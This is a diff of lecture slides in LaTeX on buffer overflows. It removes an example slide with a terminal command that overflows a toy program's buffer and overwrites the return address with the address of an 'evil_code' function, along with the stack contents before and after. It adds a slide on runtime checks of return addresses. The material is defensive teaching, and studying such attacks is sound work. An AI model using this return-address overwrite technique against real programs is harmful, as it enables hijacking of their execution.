@@ -1,23 +1,7 @@
-\frametitle{Example (2/2)}
-\textcolor{gray}{terminal\$~} ./buffer \$(python -c 'print 13*"a"+"\textbackslash{x7b}\textbackslash{x84}\textbackslash{x04}\textbackslash{x08}"') \\
-\textcolor{red}{Address of evil\_code = 0x0804847b} \\
-Stack before: \hfill \break
-0xf7712000    \hfill \break
-\dots   \hfill \break
-0xf77828f8    \hfill \break
-0xff957998    \hfill \break
-0x08048510    ~~~~~~~~~~~~~~~~\textcolor{blue}{//Return address of \textit{foo}}\hfill \break
-              \hfill \break
-Stack after : \hfill \break
-0xff958161    \hfill \break
-    \hfill \break
-0xff957978       ~~~~~~~~~~~~~~~~\textcolor{blue}{//Buffer overflow}\hfill \break
-\textcolor{red}{0x61}593d00~~~~~~~~~~~~~~~~\textcolor{blue}{//``a''   } \hfill \break
-\textcolor{red}{0x61616161}~~~~~~~~~~~~~~~~\textcolor{blue}{//``aaaa''} \hfill \break
-\textcolor{red}{0x61616161}~~~~~~~~~~~~~~~~\textcolor{blue}{//``aaaa''} \hfill \break
-\textcolor{red}{0x61616161}~~~~~~~~~~~~~~~~\textcolor{blue}{//``aaaa''} \hfill \break
-\textcolor{red}{0x0804847b}~~~~~~~~~~~~~~~~\textcolor{blue}{//"\textbackslash{x7b}\textbackslash{x84}\textbackslash{x04}\textbackslash{x08}",  \textit{evil\_code} address \\}
-\\
-Argh, we got hacked! ~~\textcolor{blue}{//Success! \textit{evil\_code} was executed}\\
-Segmentation fault (core dumped)
-
+\frametitle{Injection of runtime checks}
+\begin{enumerate}
+\item Check if the address is part of the stack
+\item Check if the address verifies $a~mod~n=0$
+\end{enumerate}
+\hfill \break
+\Check
